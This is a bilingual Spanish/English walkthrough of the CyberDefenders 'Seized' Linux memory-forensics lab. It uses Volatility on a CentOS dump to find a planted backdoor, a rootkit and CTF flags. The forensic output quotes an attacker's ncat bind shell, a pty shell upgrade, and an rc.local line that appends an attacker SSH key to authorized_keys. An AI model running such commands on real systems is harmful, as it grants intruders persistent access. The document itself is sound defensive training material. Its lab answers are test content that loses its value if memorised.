+++
title = 'Seized - Cyberdefenders (Medium)'
+++

###### Category: Endpoint Forensics

[link del laboratorio Seized](https://cyberdefenders.org/blueteam-ctf-challenges/seized/)

---

## Herramientas a utilizar

[Volatility 2](https://github.com/volatilityfoundation/volatility/releases/tag/2.6.1)

[Volatility 3](https://github.com/volatilityfoundation/volatility3)

---

## Recursos 

[Volatility cheatsheet](https://blog.onfvp.com/post/volatility-cheatsheet/)

[Volatility 2 profiles](https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles)

[Volatility 2 Linux Wiki](https://github.com/volatilityfoundation/volatility/wiki/Linux)

---

## Descargar laboratorio y moverlo a la máquina virtual REMnux

### unzip lab

```bash
7z x 92-Seized.zip -pcyberdefenders.org
```

```bash 
Centos7.3.10.1062.zip  dump.mem
```
---

## Preguntas

### Q1

What is the CentOS version installed on the machine?

¿Cuál es la versión de CentOS instalada en la máquina?


```bash
grep -a "Linux release" dump.mem
```

```bash
Linux 3.10.0-1062.el7.x86_64 CentOS Linux release 7.7.1908 (Core) 
```

```txt
-a, --text
        Procesa un archivo binario como si fuera texto; equivale a la opción --binary-files=text.  
```


#### Respuesta

`7.7.1908`



### Q2


There is a command containing a strange message in the bash history. Will you be able to read it?

Hay un comando que contiene un mensaje extraño en el historial de bash. ¿Serás capaz de leerlo?

```bash
volatility2 -f dump.mem --profile=LinuxCentos7_3_10_1062x64 linux_bash
```

```bash
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    2622 bash                 2020-05-07 14:56:16 UTC+0000   cd Documents/
    2622 bash                 2020-05-07 14:56:17 UTC+0000   echo "c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNzdF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=" > y0ush0uldr34dth1s.txt
    2622 bash                 2020-05-07 14:56:25 UTC+0000   git clone https://github.com/tw0phi/PythonBackup
    2622 bash                 2020-05-07 14:56:28 UTC+0000   cd PythonBackup/
    2622 bash                 2020-05-07 14:56:33 UTC+0000   unzip PythonBackup.zip 
    2622 bash                 2020-05-07 14:56:37 UTC+0000   python PythonBackup.py 
    2622 bash                 2020-05-07 14:56:40 UTC+0000   sudo python PythonBackup.py 
    2622 bash                 2020-05-07 14:57:05 UTC+0000   cooooooooooooooooooooooooool
    2622 bash                 2020-05-07 15:00:12 UTC+0000   cd
    2622 bash                 2020-05-07 15:00:15 UTC+0000   git clone https://github.com/504ensicsLabs/LiME
    2622 bash                 2020-05-07 15:00:19 UTC+0000   cd LiME/src/
    2622 bash                 2020-05-07 15:00:24 UTC+0000   make
    2622 bash                 2020-05-07 15:00:37 UTC+0000   sudo insmod lime-3.10.0-1062.el7.x86_64.ko "path=/Linux64.mem format=lime"
    2887 bash                 2020-05-07 14:59:42 UTC+0000   vim /etc/rc.local
```

```bash
echo "c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNzdF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=" | base64 --decode
```

```bash
shkCTF{l3ts_st4rt_th3_1nv3st_75cc55476f3dfe1629ac60}
```

#### Respuesta

`shkCTF{l3ts_st4rt_th3_1nv3st_75cc55476f3dfe1629ac60}`

### Q3

What is the PID of the suspicious process?

¿Cuál es el PID del proceso sospechoso?

```bash
volatility2 -f dump.mem --profile=LinuxCentos7_3_10_1062x64 linux_psaux
```

```bash
Pid    Uid    Gid    Arguments

2854   0      0      ncat -lvp 12345 -4 -e /bin/bash
```

#### Respuesta

`2854`


### Q4

The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor?

El atacante descargó un backdoor para ganar persistencia. Cuál es el mensaje oculto en este backdoor?

```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: commands
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Pid      Name                 Command Time                   Command
   2   │ -------- -------------------- ------------------------------ -------
   3   │     2622 bash                 2020-05-07 14:56:16 UTC+0000   cd Documents/
   4   │     2622 bash                 2020-05-07 14:56:17 UTC+0000   echo "c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNz
       │ dF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=" > y0ush0uldr34dth1s.txt
   5   │     2622 bash                 2020-05-07 14:56:25 UTC+0000   git clone https://github.com/tw0phi/PythonBackup
   6   │     2622 bash                 2020-05-07 14:56:28 UTC+0000   cd PythonBackup/
   7   │     2622 bash                 2020-05-07 14:56:33 UTC+0000   unzip PythonBackup.zip 
   8   │     2622 bash                 2020-05-07 14:56:37 UTC+0000   python PythonBackup.py 
   9   │     2622 bash                 2020-05-07 14:56:40 UTC+0000   sudo python PythonBackup.py 
  10   │     2622 bash                 2020-05-07 14:57:05 UTC+0000   cooooooooooooooooooooooooool
  11   │     2622 bash                 2020-05-07 15:00:12 UTC+0000   cd
  12   │     2622 bash                 2020-05-07 15:00:15 UTC+0000   git clone https://github.com/504ensicsLabs
       │ /LiME
  13   │     2622 bash                 2020-05-07 15:00:19 UTC+0000   cd LiME/src/
  14   │     2622 bash                 2020-05-07 15:00:24 UTC+0000   make
  15   │     2622 bash                 2020-05-07 15:00:37 UTC+0000   sudo insmod lime-3.10.0-1062.el7.x86_64.ko
       │  "path=/Linux64.mem format=lime"
  16   │     2887 bash                 2020-05-07 14:59:42 UTC+0000   vim /etc/rc.local
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```


```bash
En uno de los archivos del repositorio clonado se encuentra una línea de código oculta 
```

![hidden line](/images/labs/cyberdefenders/seized/hiddencode.png) 

![pastebin](/images/labs/cyberdefenders/seized/pastebin.png) 


```bash
echo "c2hrQ1RGe3RoNHRfdzRzXzRfZHVtYl9iNGNrZDAwcl84NjAzM2MxOWUzZjM5MzE1YzAwZGNhfQo=" | base64 --decode
```

```bash
shkCTF{th4t_w4s_4_dumb_b4ckd00r_86033c19e3f39315c00dca}
```


#### Respuesta

`shkCTF{th4t_w4s_4_dumb_b4ckd00r_86033c19e3f39315c00dca}`


### Q5

What are the attacker's IP address and the local port on the targeted machine?

¿Cuál es la dirección IP del atacante y el puerto local en la máquina objetivo?

```bash
volatility2 -f dump.mem --profile=LinuxCentos7_3_10_1062x64 linux_netstat | grep "ncat" -A 4 > netconns
```

```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: netconns
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  ncat/2854 
   2   │ TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  bash/2876 
   3   │ TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                python/2886 
   4   │ TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  bash/2887 
   5   │ TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                   vim/3196 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```

#### Respuesta

`192[.]168[.]49[.]1:12345` 


### Q6

What is the first command that the attacker executed?

¿Cuál es el primer comando que ejecutó el atacante?

```bash
volatility2 -f dump.mem --profile=LinuxCentos7_3_10_1062x64 linux_psaux | grep "ncat" -A 11 > psauxoutput
```

```bash 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: psauxoutput
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 2854   0      0      ncat -lvp 12345 -4 -e /bin/bash                                 
   2   │ 2876   0      0      /bin/bash                                                       
   3   │ 2886   0      0      python -c import pty; pty.spawn("/bin/bash")                    
   4   │ 2887   0      0      /bin/bash                                                       
   5   │ 3196   0      0      vim /etc/rc.local                                               
   6   │ 3271   0      0      /usr/sbin/abrt-dbus -t133                                       
   7   │ 3279   89     89     cleanup -z -t unix -u                                           
   8   │ 3280   89     89     trivial-rewrite -n rewrite -t unix -u                           
   9   │ 3281   0      0      local -t unix                                                   
  10   │ 3299   0      0      sleep 60                                                        
  11   │ 3612   0      0      sudo insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime
  12   │ 3614   0      0      insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```

#### Respuesta

`python -c import pty; pty.spawn("/bin/bash")` 

### Q7

After changing the user password, we found that the attacker still has access. Can you find out how?

Tras cambiar la contraseña del usuario, descubrimos que el atacante sigue teniendo acceso. ¿Puedes averiguar cómo?

```bash
volatility2 -f dump.mem --profile=LinuxCentos7_3_10_1062x64 linux_dump_map -p 3196 -D dumpfilesvim
```


```bash
┌──(fafi㉿kalipurple)-[~/Documents/labs/Seized/dumpfilesvim]
└─$ strings *.vma | grep ".ssh" > stringscommandoutput
```

```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: stringscommandoutput
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/sh                                                                       # Well played : c2hrQ1R
       │ Ge3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=                              
       │                                   echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1
       │ UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71
       │ BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5
       │ m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoa
       │ sXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authoriz
       │ ed_keys                                                                        ~                       
       │                                                         ~                                              
       │                                  ~                                                                     
       │           ~                                                                               ~            
       │                                                                    ~                                   
       │                                             ~                                                          
       │                      ~                                                                               ~ 
       │                                                                               ~                        
       │                                                        ~                                               
       │                                 ~                                                                      
       │          ~                                                                               "/etc/rc.local
       │ " 3L, 596C                                      1,1           All zed_keys> /home/k3vin/.ssh/authorized
       │ _keys && chmod 600 /home/k3vin/.ssh/authori
   2   │ ^ssh_config$
   3   │ setf sshconfig
   4   │ */.ssh/config
   5   │ /\.ssh/config$
   6   │ setf sshconfig
   7   │ ^ssh_config$
   8   │ setf sshconfig
   9   │ */.ssh/config
  10   │ /\.ssh/config$
  11   │ setf sshconfig
  12   │ ^sshd_config$
  13   │ setf sshdconfig
  14   │ ^sshd_config$
  15   │ setf sshdconfig
  16   │ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4j
       │ fEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B4
       │ 26qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvq
       │ HjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /h
       │ ome/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_keys
  17   │ +LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeD
       │ GYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3v
       │ in/.ssh/authorized
  18   │ [31mssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXaa
  19   │ [m /home/k3vin/.ssh/authorized_keys && 
  20   │ [m /home/k3vin/.ssh/authorii
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
echo "c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=" | base64 --decode
```

```bash
shkCTF{rc.l0c4l_1s_funny_be2472cfaeed467ec9cab5b5a38e5fa0}
```

#### Respuesta

`shkCTF{rc.l0c4l_1s_funny_be2472cfaeed467ec9cab5b5a38e5fa0}`


### Q8

What is the name of the rootkit that the attacker used?

¿Cuál es el nombre del rootkit que utilizó el atacante?


```bash
volatility2 -f dump.mem --profile=LinuxCentos7_3_10_1062x64 linux_check_syscall
```


```bash
Table Name Index System Call              Handler Address    Symbol                                                      
---------- ----- ------------------------ ------------------ ------------------------------------------------------------

64bit         88                          0xffffffffc0a12470 HOOKED: sysemptyrect/syscall_callback 
```


#### Respuesta

`sysemptyrect`


### Q9

The rootkit uses crc65 encryption. What is the key?

El rootkit utiliza cifrado crc65. ¿Cuál es la clave?

```bash
strings dump.mem | grep 'sysemptyrect' | grep 'crc65' | uniq | awk '{print $3}'
```

```bash
crc65_key=1337tibbartibbar
```

#### Respuesta

`1337tibbartibbar` 

